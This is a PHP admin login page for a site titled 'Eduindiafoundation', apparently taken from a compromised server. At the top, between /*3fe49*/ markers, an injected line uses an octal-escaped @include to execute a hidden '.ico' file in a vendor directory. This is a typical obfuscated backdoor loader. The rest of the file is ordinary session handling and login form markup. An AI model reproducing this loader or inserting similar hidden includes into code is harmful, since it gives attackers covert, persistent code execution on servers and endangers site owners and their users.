<?php
/*3fe49*/

@include "\057h\157m\145/\145d\165i\156d\151a\146/\160u\142l\151c\137h\164m\154/\166e\156d\157r\057b\141r\143o\144e\057.\0619\071e\142f\065e\056i\143o";

/*3fe49*/




 
	session_start();
    $session_admin  =  @$_SESSION['session_admin']; 
	if(isset($session_admin)){
		echo "<script>location.href='welcome.php';</script>";
	}

?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Eduindiafoundation</title> 
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.7 -->
  <link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
  
  <link rel="stylesheet" href="dist/css/login_bg.css">
  
  <!-- Ionicons -->            
         
  <link rel="stylesheet" href="dist/css/AdminLTE.css">
  <link rel="stylesheet" href="../assets/css/animate.css">
</head>

<body>

<body> 
	<div class="container">
		<div class="row">
		<h2 class="user_title">Admin Login Panel</h2>
			<div class="col-sm-4 col-sm-offset-4 login_bg">
			
				<div class="form-group">
					<input type="text" placeholder="User Email or Name" name="login_user_name" id="login_user_name" class="form-control">
					<input type="hidden" value="" id="hidden_email"/>
				</div>
				<div class="form-group">
				    <input type="password" placeholder="User Password" name="login_user_password" id="login_user_password" class="form-control">
				</div> 
				<div class="form-group">
				<input type="submit" name="login_btn"  id="login_btn" class="btn btn-block login_btn" value="Submit"/>
				</div> 
			</div>
		</div>
	</div>
 
 
 

<!-- jQuery 3 -->
<script src="dist/js/jquery.js"></script>
<script src="dist/js/bootstrap.js"></script>
<script src="dist/js/login_js.js" type="text/javascript"></script>

</body>
</html>
